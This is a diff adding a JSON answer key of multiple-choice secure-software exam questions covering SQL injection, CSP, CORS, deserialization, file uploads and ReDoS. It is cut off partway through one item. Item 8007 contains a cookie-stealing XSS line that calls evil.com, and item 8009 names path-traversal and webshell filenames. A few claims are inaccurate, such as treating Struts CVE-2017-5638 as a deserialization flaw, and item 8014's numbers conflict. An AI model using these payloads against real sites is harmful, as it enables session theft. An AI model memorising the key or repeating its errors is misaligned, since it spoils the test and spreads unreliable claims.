@@ -1,0 +1,377 @@
+[
+  {
+    "id": 8001,
+    "domain": 8,
+    "text": "A development team is building a healthcare application that processes PHI. The team uses an Agile methodology with 2-week sprints. A security architect argues that security cannot be 'sprinted' into the product and must be planned from the start. A developer responds that security will be added after core features are built. Which position is supported by the Software Development Lifecycle (SDLC) security best practices?",
+    "options": [
+      "The developer is correct — adding security post-development is more efficient since requirements are stable by then",
+      "The security architect is correct — Microsoft SDLC, OWASP SAMM, and NIST SP 800-64 establish that security requirements must be defined in the requirements phase; retrofitting security is 10-100x more expensive than building it in from the start; for a PHI application, security and privacy requirements (threat model, data flow analysis, privacy impact assessment) must precede feature development; in Agile, this means: security stories in the product backlog from Sprint 1, threat modeling at architecture design, security acceptance criteria per user story, and dedicated security review sprints",
+      "Security should be addressed only for features that handle PHI directly — general UI components don't require security focus",
+      "Agile and security-by-design are incompatible — waterfall SDLC is required for regulated healthcare applications"
+    ],
+    "answer": 1,
+    "explanation": "Security cost of change follows the '1-10-100 rule': fixing a security issue in requirements costs $1, in design $10, in implementation $100, in production $1000+. Agile and DevSecOps are compatible with security-by-design: (1) Initial sprints: threat modeling, security requirements, architecture security review; (2) Per-user story: security acceptance criteria; (3) Per sprint: SAST scanning, dependency checking; (4) Per release: penetration testing; (5) Healthcare PHI applications have regulatory requirements (HIPAA) that must be addressed from the start. 'Add security later' consistently produces applications requiring expensive redesign or accepting long-term risk.",
+    "weakness": "Security-by-design, SDLC security, Agile security integration",
+    "references": ["https://csrc.nist.gov/pubs/sp/800/64/r2/final", "https://owasp.org/www-project-samm/"]
+  },
+  {
+    "id": 8002,
+    "domain": 8,
+    "text": "During a code review, a security engineer identifies the following Python code:\n\ndef get_user(username):\n    query = 'SELECT * FROM users WHERE username = \\'' + username + '\\''\n    return db.execute(query)\n\nA developer argues 'we validate that username contains only alphanumeric characters before calling this function.' Is this sufficient protection against SQL injection?",
+    "options": [
+      "Yes — input validation that restricts to alphanumeric characters makes SQL injection impossible",
+      "No — defense-in-depth requires parameterized queries regardless of input validation: (1) Validation is a first-line control that can be bypassed by encoding (unicode normalization), logic errors, or future code changes; (2) Parameterized queries (prepared statements) provide database-level protection that cannot be bypassed by input manipulation; (3) The code pattern is inherently fragile — future developers may add special characters to allowed input without realizing the security impact; the CORRECT fix is: query = 'SELECT * FROM users WHERE username = %s'; db.execute(query, (username,))",
+      "Yes — alphanumeric-only usernames have no SQL metacharacters and cannot form injection payloads",
+      "The validation approach is correct — replace the string concatenation with f-string formatting for the same security level"
+    ],
+    "answer": 1,
+    "explanation": "Defense-in-depth for SQL injection requires parameterized queries as the authoritative control — not as a supplement to input validation. Reasons input validation alone is insufficient: (1) Unicode normalization attacks can introduce SQL metacharacters after validation; (2) Future code changes may expand allowed characters; (3) Multiple code paths may bypass the validation function; (4) Second-order SQL injection: data stored via validated path can be retrieved and inserted into different queries; (5) Defense-in-depth principle. Parameterized queries use the database engine's native separation of code and data — the input can contain ANY characters and will never be interpreted as SQL. Both controls together: validation (security posture) + parameterized queries (definitive prevention).",
+    "weakness": "SQL injection, parameterized queries, defense in depth",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8003,
+    "domain": 8,
+    "text": "A software team uses open-source libraries extensively. A dependency audit reveals the project uses 847 direct and transitive dependencies, several of which have known critical CVEs. The team argues that 'we only use the specific functions from these libraries that aren't vulnerable.' What is the MOST significant risk with this reasoning?",
+    "options": [
+      "The team is correct — if the vulnerable functions are not called, the vulnerability cannot be exploited",
+      "This reasoning is unreliable: (1) Determining which code paths reach vulnerable functions at runtime is not trivially solvable; (2) Indirect calls, dependency injection, and serialization can trigger vulnerable code paths unexpectedly; (3) An attacker may reach the vulnerable code through application inputs you haven't considered; (4) Even if true today, application changes may create new paths to vulnerable code; (5) The mere presence of a vulnerable library creates reputational and compliance risk (PCI DSS requires patching regardless of reachability claims); proper remediation: update or replace the vulnerable dependency",
+      "The team's approach is appropriate for internal applications but not for internet-facing applications",
+      "Agree with the team — reachability analysis is the correct modern approach to vulnerability prioritization"
+    ],
+    "answer": 1,
+    "explanation": "Reachability-based vulnerability analysis is an emerging but imperfect approach. The 'we don't call the vulnerable function' argument fails for multiple reasons: (1) Call graph analysis is complex and incomplete for dynamic languages; (2) Reflection, dynamic dispatch, and serialization create invisible code paths; (3) Transitive dependencies introduce vulnerable code the team didn't choose; (4) Compliance frameworks (PCI DSS, FedRAMP) typically require patching regardless of reachability claims; (5) Supply chain attacks: if the library itself is compromised (SolarWinds-style), the injected code may add new call paths. Best practice: SCA tools + vulnerability prioritization by criticality + update dependencies as the primary remediation.",
+    "weakness": "Software composition analysis, dependency vulnerabilities, supply chain security",
+    "references": ["https://owasp.org/www-project-dependency-check/", "https://www.nist.gov/pubs/sp/800/218/final"]
+  },
+  {
+    "id": 8004,
+    "domain": 8,
+    "text": "A developer implements authentication for an API endpoint: the client sends an API key in a header, and the server checks if it matches any key in a database using a string comparison. A security review flags a timing attack vulnerability. Explain the vulnerability and the fix.",
+    "options": [
+      "String comparison is secure — timing attacks require physical access to the server",
+      "Standard string comparison (==) is vulnerable to timing attacks: the comparison short-circuits when a character mismatch is found, meaning different comparison durations reveal information about matching prefixes; an attacker can measure response times across many requests to infer correct key characters one at a time, reducing the search space from 62^N to 62×N; the fix is constant-time comparison: use hmac.compare_digest() in Python, crypto.timingSafeEqual() in Node.js, or equivalent — these functions always take the same time regardless of where the mismatch occurs, preventing timing oracle attacks",
+      "The fix is to hash the API key before comparison — hashed comparison prevents timing attacks",
+      "Rate limiting API requests prevents timing attacks — the attacker cannot make enough requests to extract meaningful timing information"
+    ],
+    "answer": 1,
+    "explanation": "Timing attacks exploit the measurable time difference in string comparison based on where a mismatch occurs. Short-circuit comparison: compare 'aaaaa...' vs 'bbbbb...' returns immediately (first character mismatch); compare 'xaaaa...' vs 'xbbbb...' takes slightly longer (first character matches). By measuring microsecond differences across thousands of requests, attackers can enumerate correct characters. Constant-time comparison: compares all characters regardless of where mismatch occurs, ensuring uniform response time. This applies to: API keys, HMAC signatures, secret tokens, and any authentication value comparison. Rate limiting doesn't eliminate timing differences — it just slows the attack.",
+    "weakness": "Timing attacks, constant-time comparison, API key security",
+    "references": ["https://codahale.com/a-lesson-in-timing-attacks/", "https://owasp.org/www-project-cheat-sheets/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8005,
+    "domain": 8,
+    "text": "A threat model for a new web application uses the STRIDE methodology. During modeling, the team identifies that the API gateway does not validate the 'sub' (subject) claim in JWT tokens — any JWT with a valid signature is accepted regardless of the sub claim. Which STRIDE threat category does this fall under?",
+    "options": [
+      "Tampering — attackers can modify JWT token claims to change their identity",
+      "Spoofing — an attacker with a valid JWT for user A can potentially forge or use their token to represent user B; the missing 'sub' claim validation means the authorization decision doesn't verify that the authenticated identity matches the resource owner; this is an identity spoofing vulnerability allowing unauthorized access to other users' resources",
+      "Repudiation — the missing claim validation prevents proper attribution of actions to users",
+      "Information Disclosure — JWT tokens without proper claim validation expose internal user identifiers"
+    ],
+    "answer": 1,
+    "explanation": "STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). This vulnerability is Spoofing — the attacker can act as another user by presenting a valid JWT for themselves but accessing another user's resources. The sub claim validation gap: if the API accepts any valid JWT without checking that sub matches the resource being accessed, an authenticated attacker can include their own valid JWT when requesting another user's resources, bypassing authorization. This is distinct from Tampering (modifying the token itself) — the token itself isn't modified; the server's authorization check is incomplete.",
+    "weakness": "STRIDE threat modeling, JWT authorization, spoofing threats",
+    "references": ["https://owasp.org/www-project-threat-dragon/", "https://csrc.nist.gov/pubs/sp/800/154/final"]
+  },
+  {
+    "id": 8006,
+    "domain": 8,
+    "text": "A mobile application development team stores sensitive user data in NSUserDefaults (iOS) and SharedPreferences (Android). A security review team argues this is insecure. Under what conditions is this concern valid?",
+    "options": [
+      "The concern is invalid — NSUserDefaults and SharedPreferences are part of the OS security boundary",
+      "The concern is valid under multiple conditions: (1) On rooted/jailbroken devices, these storage locations are readable by any app or user with root access; (2) If device backup is enabled, this data may be backed up to cloud (iCloud, Google Drive) in unencrypted form; (3) Malware with root access or exploit-based privilege escalation can access these stores; (4) For sensitive data (authentication tokens, PII, financial data), use platform-provided secure storage: iOS Keychain (hardware-backed on modern devices) or Android Keystore (TEE/StrongBox hardware backing) — these provide hardware-enforced access controls that survive jailbreak attempts",
+      "NSUserDefaults and SharedPreferences use OS-level encryption — they are equivalent to Keychain/Keystore for security",
+      "The concern only applies to Android — iOS NSUserDefaults is protected by the hardware secure enclave"
+    ],
+    "answer": 1,
+    "explanation": "Mobile secure storage requirements depend on data sensitivity: (1) NSUserDefaults/SharedPreferences: unencrypted, world-readable on rooted devices, included in unencrypted backups; (2) iOS Keychain: hardware-backed on modern devices, encrypted, can be configured as non-migratable (hardware-bound), survives app reinstall; (3) Android Keystore: TEE (Trusted Execution Environment) or StrongBox (dedicated hardware security chip) backed, cryptographic operations stay in hardware; (4) OWASP MASVS (Mobile Application Security Verification Standard) L2 requires all sensitive data in secure storage. Authentication tokens, session cookies, and PII must use Keychain/Keystore.",
+    "weakness": "Mobile data storage, iOS Keychain, Android Keystore, OWASP MASVS",
+    "references": ["https://owasp.org/www-project-mobile-security-testing-guide/", "https://mas.owasp.org/MASVS/"]
+  },
+  {
+    "id": 8007,
+    "domain": 8,
+    "text": "A software team implements a Content Security Policy (CSP) header as a mitigation for XSS attacks. Their CSP includes: Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'. A security reviewer flags the 'unsafe-inline' directive as defeating the purpose. Why?",
+    "options": [
+      "The CSP is acceptable — 'self' restriction limits inline scripts to the same origin",
+      "'unsafe-inline' allows all inline JavaScript to execute including attacker-injected <script> tags and on* event handlers — this completely defeats CSP's primary XSS mitigation purpose; if an attacker injects <script>document.location='evil.com?'+document.cookie</script> into the page, 'unsafe-inline' permits it to execute; the correct approach: remove 'unsafe-inline' and refactor inline scripts to external files (which can use 'self'), or use CSP nonces/hashes where individual inline scripts are authorized by a per-request cryptographic nonce that attackers cannot predict",
+      "The 'unsafe-inline' directive is required for modern web applications — all CSP policies must include it",
+      "'unsafe-inline' only allows inline styles, not scripts — the CSP correctly prevents script injection"
+    ],
+    "answer": 1,
+    "explanation": "CSP (Content Security Policy) was specifically designed to prevent XSS by restricting which scripts can execute. The script-src directive controls JavaScript execution: (1) 'self' allows scripts from the same origin; (2) 'unsafe-inline' allows ALL inline scripts — exactly what XSS attackers inject. Adding 'unsafe-inline' makes the CSP unable to prevent injected inline script execution — the attacker's script is also 'inline.' Correct approaches: (1) Remove 'unsafe-inline' and use external JS files; (2) Use CSP nonces: script-src 'nonce-{random}'; each inline script gets a server-generated nonce in the tag; (3) Use CSP hashes for static inline scripts. CSP Nonces (cryptographically random per request) are the modern best practice.",
+    "weakness": "Content Security Policy, XSS mitigation, CSP nonces",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html", "https://csp.withgoogle.com/docs/strict-csp.html"]
+  },
+  {
+    "id": 8008,
+    "domain": 8,
+    "text": "A financial application team uses a third-party payment library that processes credit card data. The library is 3 years old and maintained by a single developer. The team trusts it because 'it's passed all our internal testing.' What supply chain risk does this represent?",
+    "options": [
+      "No significant risk — internal testing validates that the library behaves correctly for the team's use case",
+      "This represents significant supply chain risk: (1) Single-maintainer libraries are high compromise targets (developer social engineering, account takeover, physical coercion); (2) 3-year-old payment library may contain known CVEs that haven't been patched; (3) Internal testing validates functionality, not security integrity of the library itself; (4) PCI DSS requires software integrity verification; (5) npm/PyPI/Maven supply chain attacks have increasingly targeted payment-adjacent libraries; mitigate: verify the library's source integrity (signature, hash), check for CVEs, evaluate the maintainer's security practices, consider alternatives with broader maintainer bases and active security programs",
+      "Trust the library — public open-source libraries are safer than commercial libraries due to community review",
+      "Replace with a closed-source commercial library — proprietary code cannot be targeted in supply chain attacks"
+    ],
+    "answer": 1,
+    "explanation": "Software supply chain risk for single-maintainer libraries handling sensitive data (payment card): (1) Account compromise: npm, PyPI, and GitHub account takeovers are used to inject malicious code into popular packages; (2) Dependency confusion attacks: injecting malicious packages with the same name into public registries; (3) Maintainer coercion or social engineering; (4) Stale code: 3-year-old payment library may have multiple CVEs if not regularly updated; (5) SolarWinds, XZ Utils (CVE-2024-3094), and event-stream npm package are examples of supply chain attacks via trusted libraries. SLSA framework (Supply-chain Levels for Software Artifacts) and SBOM (Software Bill of Materials) are emerging standards for supply chain security.",
+    "weakness": "Software supply chain security, third-party library risk, SBOM",
+    "references": ["https://www.nist.gov/pubs/sp/800/161/r1/final", "https://slsa.dev/"]
+  },
+  {
+    "id": 8009,
+    "domain": 8,
+    "text": "A web application developer implements file upload functionality that accepts user-uploaded images. The upload handler saves files using the user-supplied filename and stores them in the web server's document root directory. A security reviewer flags multiple critical vulnerabilities. What are they?",
+    "options": [
+      "The only vulnerability is that users can upload malicious image files — implement antivirus scanning of uploads",
+      "Multiple critical vulnerabilities: (1) Path traversal — user can supply filename '../../etc/cron.d/backdoor' writing to arbitrary filesystem locations; (2) Webshell upload — filename 'shell.php' allows uploading executable server-side scripts; (3) Content-type trust — MIME type from client is not a reliable indicator of actual file content; (4) Document root storage — uploaded files are directly web-accessible and executable; fix: generate random server-side filename, validate content by magic bytes (not extension), store outside document root with access via application serving, whitelist only safe image MIME types after server-side validation",
+      "The only issue is the document root storage — move uploads to a separate storage server",
+      "Implement HTTPS for file uploads — encryption prevents malicious file content from being intercepted"
+    ],
+    "answer": 1,
+    "explanation": "Unrestricted file upload is OWASP A04:2021 and a critical class of vulnerabilities: (1) Path traversal: ../../etc/passwd or ../../cron.d/backdoor overwrite arbitrary system files; (2) Webshell: uploading shell.php provides remote code execution if stored in web root; (3) Directory traversal from storage outside web root still exploitable through application logic; (4) Content-type spoofing: browsers and users control MIME type header. Secure file upload: (1) Generate random filename with safe extension; (2) Validate content by magic bytes, not extension or MIME header; (3) Store outside document root; (4) Serve through application layer; (5) Content disposition header to force download; (6) Image re-encoding to strip embedded payloads (EXIF metadata, polyglot files).",
+    "weakness": "File upload security, path traversal, webshell prevention",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload", "https://owasp.org/www-project-top-ten/"]
+  },
+  {
+    "id": 8010,
+    "domain": 8,
+    "text": "A development team uses automated DAST (Dynamic Application Security Testing) in their CI/CD pipeline. The DAST tool finds 0 vulnerabilities in each sprint. A security architect argues this doesn't mean the application is secure. What is the CORRECT interpretation of these results?",
+    "options": [
+      "Zero DAST findings indicates the application has no security vulnerabilities — the CI/CD integration is working correctly",
+      "Zero DAST findings indicates no vulnerabilities were found by this specific tool with its current configuration and scope — not that no vulnerabilities exist: (1) DAST tools have limited coverage of application logic (authentication bypass, business logic flaws, IDOR); (2) Authenticated testing coverage may be incomplete; (3) Many vulnerability classes require manual testing (complex multi-step attacks); (4) DAST complements but doesn't replace SAST, manual code review, SCA, and penetration testing; (5) The tool may be misconfigured, timing out, or not reaching all application functionality; (6) Verify DAST coverage metrics — what percentage of endpoints were actually tested?",
+      "Zero DAST findings is suspicious — DAST always finds some issues; the tool is probably broken",
+      "Complement DAST with SAST — SAST covers the vulnerability classes DAST misses, and together they provide complete coverage"
+    ],
+    "answer": 1,
+    "explanation": "DAST (Dynamic Application Security Testing) has important coverage limitations: (1) Business logic vulnerabilities are application-specific and not detectable by generic scanners; (2) IDOR requires knowledge of valid object identifiers; (3) Authentication/authorization flaws may require complex state sequences; (4) DOM-based XSS may be missed by tools without JavaScript execution; (5) API-specific vulnerabilities may require authenticated API testing configuration. A comprehensive security testing program: SAST (static code) + DAST (runtime) + SCA (dependencies) + manual code review + penetration testing. Zero DAST findings on a mature application may be expected — but coverage metrics should be reviewed to confirm the tool is actually testing the application's functionality.",
+    "weakness": "DAST limitations, security testing coverage, defense in depth testing",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/", "https://www.nist.gov/pubs/sp/800/115/final"]
+  },
+  {
+    "id": 8011,
+    "domain": 8,
+    "text": "A development team implements Cross-Origin Resource Sharing (CORS) with the following configuration: Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true. A security engineer flags this as a critical misconfiguration. Why?",
+    "options": [
+      "The configuration is standard practice for public APIs — wildcard origin with credentials is commonly used",
+      "This is a critical CORS misconfiguration: the combination of Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true is explicitly prohibited by the CORS specification (browsers block this combination) — however, if implemented via dynamic reflection (reflecting the Origin header back rather than using *), it allows any website to make credentialed cross-origin requests using the victim's session cookies; an attacker's website can make authenticated API calls on behalf of any user who visits attacker.com while logged into the target site",
+      "The wildcard origin is the only issue — changing to specific origins resolves the CORS security concern",
+      "CORS misconfigurations can only be exploited from the server side — browser same-origin policy prevents the described attack"
+    ],
+    "answer": 1,
+    "explanation": "CORS misconfiguration for credentialed requests: browsers prohibit Access-Control-Allow-Origin: * with credentials per spec. However, many servers dynamically reflect the Origin header: if Origin: https://attacker.com → Access-Control-Allow-Origin: https://attacker.com. Combined with Allow-Credentials: true, this allows: (1) User visits attacker.com while logged into target.com; (2) attacker.com makes XHR to api.target.com/sensitive-data with withCredentials: true; (3) Browser includes session cookies; (4) Server responds with Access-Control-Allow-Origin: https://attacker.com (reflected); (5) Browser allows attacker.com to read the response. This is CSRF without a CSRF token requirement. Fix: explicit allow-list of trusted origins, never dynamically reflect arbitrary origins.",
+    "weakness": "CORS misconfiguration, credential-bearing cross-origin requests, dynamic origin reflection",
+    "references": ["https://portswigger.net/web-security/cors", "https://owasp.org/www-project-web-security-testing-guide/"]
+  },
+  {
+    "id": 8012,
+    "domain": 8,
+    "text": "During code review, a security engineer finds that an application uses Java deserialization to process data from an external API: ObjectInputStream ois = new ObjectInputStream(apiResponse.getInputStream()); Object data = ois.readObject(). What critical security risk does this code introduce?",
+    "options": [
+      "The code is secure if the API response is validated to contain only expected object types",
+      "Java deserialization of untrusted data can lead to Remote Code Execution (RCE): the deserialization process instantiates arbitrary objects and calls their constructor/readObject methods before the application can validate the type; attackers craft malicious serialized payloads using gadget chains (sequences of classes in common libraries like Apache Commons Collections, Spring, Guava) that trigger code execution during deserialization; this is CVE-level critical — several mass exploitation events used Java deserialization; fix: never deserialize untrusted data with native Java deserialization; use safer formats (JSON with schema validation) or implement deserialization filters (ObjectInputFilter in Java 9+)",
+      "The vulnerability is limited to denial of service — malformed objects can crash the application but cannot execute code",
+      "Wrap the readObject() call in try-catch to handle deserialization errors safely"
+    ],
+    "answer": 1,
+    "explanation": "Java Deserialization vulnerabilities (OWASP A08:2021 — Software and Data Integrity Failures) are among the most critical: (1) readObject() method executes code during deserialization before type checking; (2) Gadget chains (found by tools like ysoserial) chain library classes to achieve RCE; (3) Apache Struts CVE-2017-5638, WebLogic, JBoss, and many others were breached via Java deserialization; (4) Type checking occurs AFTER the dangerous code execution in readObject(). Solutions: avoid native Java deserialization entirely, use JSON/Protobuf/etc., implement java.io.ObjectInputFilter to allowlist expected classes, use SerialKiller or Contrast Security's deserialization defenses.",
+    "weakness": "Java deserialization, RCE, gadget chains",
+    "references": ["https://owasp.org/www-project-top-ten/", "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8013,
+    "domain": 8,
+    "text": "A team is conducting threat modeling for a microservices application. Service A calls Service B, which calls Service C. Each service has its own JWT-based authentication. Service B is publicly accessible. A red team suggests that a compromised Service B can be used to make authenticated calls to Service C with elevated privileges. What design flaw does this illustrate?",
+    "options": [
+      "Service B should not be publicly accessible — restricting access to internal services resolves the threat",
+      "This illustrates confused deputy problem and insufficient service-to-service authorization: Service C trusts JWTs from Service B, but doesn't verify that Service B's call originates from a legitimate user request; a compromised Service B (which has legitimate JWT credentials for C) can make arbitrary calls to Service C beyond what any legitimate user could trigger; solution: Service C should verify both that Service B is the caller (mTLS) AND that the original user identity has permission for the requested action (end-user principal propagation in the JWT or separate user-context token forwarding)",
+      "The design is correct — service-to-service JWT authentication is the recommended microservices security pattern",
+      "Service C should not be accessible from Service B — services should only communicate with services in the same security tier"
+    ],
+    "answer": 1,
+    "explanation": "The Confused Deputy problem in microservices: Service B has legitimate service credentials that Service C trusts. When Service B is compromised, the attacker inherits Service B's trust relationship with Service C — accessing C with Service B's full service-level permissions regardless of what the original user was authorized to do. Solutions: (1) End-user context propagation: the original user's JWT (with their permissions) is forwarded through the service chain, and each service validates user-level permissions; (2) Phantom Token Pattern: external JWT references to internal, more detailed tokens; (3) Scope limitation: Service B's JWT only allows specific operations on Service C matching what users can trigger; (4) mTLS + JWT: authenticate service identity + user context separately.",
+    "weakness": "Confused deputy problem, service-to-service authorization, microservices security",
+    "references": ["https://owasp.org/www-project-api-security/", "https://csrc.nist.gov/pubs/sp/800/204/final"]
+  },
+  {
+    "id": 8014,
+    "domain": 8,
+    "text": "A development team implements rate limiting by storing request counts in an in-memory variable within each application server instance. The application runs on 10 auto-scaling servers. A user makes 5 requests per server (50 total), but the rate limit is 10 requests/minute per user. Why does this implementation fail?",
+    "options": [
+      "The implementation is correct — each server's rate limit applies independently",
+      "Distributed rate limiting requires shared state: the in-memory counter on each server only tracks requests handled by that specific instance; with 10 servers and round-robin load balancing, a user can make 10 requests per server × 10 servers = 100 requests/minute while each server only sees 10; for effective rate limiting in distributed environments, use centralized counter storage: Redis with atomic increment operations (INCR), distributed cache with TTL, or API gateway rate limiting that operates on the shared connection pool — not per-instance memory",
+      "The solution is to synchronize in-memory variables across servers using a distributed lock",
+      "Rate limiting at the application layer is never effective — implement at the network layer instead"
+    ],
+    "answer": 1,
+    "explanation": "Distributed rate limiting is a common implementation failure. In-memory rate limiting works only for single-server deployments. In a distributed environment: (1) Auto-scaling means servers spin up/down; (2) Load balancers distribute requests across instances; (3) Each instance has no knowledge of requests handled by siblings. Solutions: (1) Redis with INCR and TTL — atomic operations ensure consistent counting; (2) Token bucket algorithm in Redis (sliding window log, fixed window counter); (3) API Gateway rate limiting (AWS API Gateway, Kong, Nginx) — gateway is the single point before distribution; (4) Shared database counter (less performant but simpler). Redis is the standard solution for high-performance distributed rate limiting.",
+    "weakness": "Distributed rate limiting, shared state, Redis rate limiting",
+    "references": ["https://owasp.org/www-project-automated-threats-to-web-applications/"]
+  },
+  {
+    "id": 8015,
+    "domain": 8,
+    "text": "A security code review identifies the following issue in a Node.js application: the application passes user input to a regular expression for validation: const regex = new RegExp(userInput); regex.test(inputData). What vulnerability does this create?",
+    "options": [
+      "XSS — user input in a regular expression can inject JavaScript",
+      "ReDoS (Regular Expression Denial of Service): user-supplied regular expressions can contain catastrophically backtracking patterns; certain regex patterns with nested quantifiers on the same input cause exponential time complexity; an attacker sends a carefully crafted regex that causes the server to hang while processing; for example: (a+)+ against 'aaaaaab'; additionally, allowing user input to define the regex provides read/write to the regex engine's backtracking mechanism; fix: never allow user-supplied regex patterns; use a regex pattern allowlist, or sanitize with a regex complexity limit; the re2 library (polynomial-time regex) prevents catastrophic backtracking",
+      "SQL injection — regular expressions can contain database commands",
+      "Path traversal — user-controlled regex can match file paths outside the intended directory"
+    ],
+    "answer": 1,
+    "explanation": "ReDoS exploits pathological regex patterns that cause exponential backtracking: (1) Pattern (a+)+ against 'aaaa...b' requires 2^n backtracking steps for n 'a' characters; (2) A 30-character input can cause seconds of CPU time; (3) A 50-character input can take hours; (4) In single-threaded environments (Node.js event loop), ReDoS blocks all request processing. Allowing user-supplied regex is doubly problematic: the user defines both the pattern AND the exponential complexity. Mitigations: (1) Use re2 library (guaranteed polynomial time); (2) Set regex timeout limits; (3) Never allow user-supplied regex patterns; (4) Validate regex complexity before use. Node.js's default regex engine is vulnerable to catastrophic backtracking.",
+    "weakness": "ReDoS, regular expression security, input validation",
+    "references": ["https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"]
+  },
+  {
+    "id": 8016,
+    "domain": 8,
+    "text": "A team is implementing HTTP security headers. They add: X-Frame-Options: SAMEORIGIN. A security review suggests adding Content-Security-Policy: frame-ancestors 'self' as well. What is the rationale for adding the CSP frame-ancestors directive when X-Frame-Options is already present?",
+    "options": [
+      "The headers are redundant — X-Frame-Options is sufficient and CSP frame-ancestors is unnecessary",
+      "CSP frame-ancestors is the modern, standards-compliant replacement that provides additional flexibility: (1) X-Frame-Options is deprecated in favor of CSP frame-ancestors per HTML specification; (2) CSP frame-ancestors supports granular allowlists ('self' + specific trusted domains) while X-Frame-Options is more limited; (3) Some modern browsers (particularly Safari) have had inconsistent X-Frame-Options implementation; (4) CSP frame-ancestors takes precedence over X-Frame-Options in modern browsers; (5) Implementing both provides coverage for older browsers that don't support CSP; this is defense-in-depth for clickjacking protection",
+      "X-Frame-Options: SAMEORIGIN is too permissive — CSP frame-ancestors 'none' should be used instead",
+      "CSP frame-ancestors controls who can embed the page in iframes; X-Frame-Options controls who the page can embed — they solve different problems"
+    ],
+    "answer": 1,
+    "explanation": "X-Frame-Options vs CSP frame-ancestors: (1) X-Frame-Options was the original clickjacking protection header; (2) CSP frame-ancestors is the successor, supported by all modern browsers; (3) CSP frame-ancestors syntax: 'none' (no framing), 'self' (same origin only), specific origins; (4) In browsers that support CSP frame-ancestors, it takes precedence over X-Frame-Options; (5) Defense-in-depth: include both to cover legacy browsers (IE11) that support XFO but not CSP frame-ancestors; (6) CSP nonce-based scripts can also be combined with frame-ancestors in a comprehensive CSP header. The OWASP recommendation is to implement both for maximum compatibility.",
+    "weakness": "HTTP security headers, clickjacking, CSP frame-ancestors",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/HTTP_Headers_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors"]
+  },
+  {
+    "id": 8017,
+    "domain": 8,
+    "text": "A developer argues that client-side input validation is sufficient for a web form that collects patient data. They have implemented comprehensive JavaScript validation that checks all required fields and data formats. A security engineer disagrees. What is the DEFINITIVE reason client-side validation cannot be the sole validation control?",
+    "options": [
+      "JavaScript can be disabled in some browsers — server-side validation ensures data quality for all browsers",
+      "Client-side validation exists entirely within the attacker's control: any attacker can bypass it by: (1) Disabling JavaScript in the browser; (2) Using browser developer tools to modify the DOM; (3) Using tools like Burp Suite to intercept and modify requests after JavaScript validation runs; (4) Making direct HTTP requests without a browser; client-side validation is a UX enhancement that prevents normal user mistakes — it provides ZERO security guarantees; all security-relevant validation must be performed server-side where the attacker cannot interfere",
+      "Server-side validation is faster than client-side JavaScript — performance justifies the additional server load",
+      "HIPAA requires server-side validation for all PHI data — client-side validation alone is non-compliant"
+    ],
+    "answer": 1,
+    "explanation": "Client-side validation is under attacker control — this is the fundamental security principle. Bypass methods: (1) Burp Suite intercept/modify: JavaScript runs, validation passes, Burp captures the request and sends a modified version to the server; (2) curl/Python requests: bypass the browser entirely; (3) Developer tools: delete the form's onsubmit handler; (4) JavaScript disable. ALL input validation for security purposes MUST be server-side. Client-side validation serves legitimate UX purposes (immediate feedback, reduced server load for invalid data) but provides no security guarantee. The server must assume all incoming data is potentially malicious regardless of client-side validation presence.",
+    "weakness": "Client vs server-side validation, input validation principles",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8018,
+    "domain": 8,
+    "text": "A security team is reviewing a REST API that returns sensitive employee data. The API response includes all employee fields including: salary, SSN, home address, emergency contacts, and medical accommodation status. The requesting application only needs name, email, and department. This is an example of which security vulnerability?",
+    "options": [
+      "SQL injection — the API is returning more data than requested from the database",
+      "Excessive Data Exposure (OWASP API Security API3:2023): the API returns all available data and relies on the client to filter what it displays; this violates data minimization principles and creates unnecessary exposure — any interception, logging, or client compromise exposes sensitive fields never needed for the use case; fix: API responses should only include fields needed for the specific use case (principle of minimum necessary disclosure), not a full data dump of the underlying object; implement response filtering server-side or define purpose-specific API endpoints",
+      "Broken Authentication — the API should verify the requesting application's permission to access salary and SSN",
+      "Insecure Direct Object Reference — the API should not return data objects directly"
+    ],
+    "answer": 1,
+    "explanation": "Excessive Data Exposure (now categorized under API3:2023 Broken Object Property Level Authorization) is pervasive in APIs: developers return entire data objects and let the frontend decide what to display. Risks: (1) API responses are logged (application logs, network captures, WAF logs) — all fields are captured regardless of display; (2) Man-in-the-Middle interception captures the full response; (3) Client-side code bugs or future changes may accidentally display hidden fields; (4) Compliance: GDPR data minimization and HIPAA minimum necessary standard prohibit transmitting data not required for the purpose. Fix: server-side field selection based on the API consumer's use case, or GraphQL with field-level authorization.",
+    "weakness": "Excessive data exposure, API security, data minimization",
+    "references": ["https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"]
+  },
+  {
+    "id": 8019,
+    "domain": 8,
+    "text": "A development team stores configuration including database connection strings and API keys in their application's source code repository (Git). The security team discovers this and demands immediate remediation. Which secrets management approach BEST replaces hardcoded secrets in code?",
+    "options": [
+      "Store secrets in a separate configuration file that is .gitignored — this removes them from the repository",
+      "Implement a secrets management service: inject secrets at runtime through environment variables from a secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager); secrets never exist in source code, configuration files, or build artifacts; the application receives secrets via: (1) Environment variables set by the deployment orchestration; (2) Runtime API calls to the secrets manager using the application's IAM identity; (3) Sidecar injection patterns in Kubernetes; additionally, rotate all currently exposed secrets immediately as they must be treated as compromised",
+      "Encrypt secrets with AES-256 and store the encrypted values in the repository — the encryption key can be stored separately",
+      "Use environment-specific configuration files with restricted repository access — only deployment pipelines have access to the files"
+    ],
+    "answer": 1,
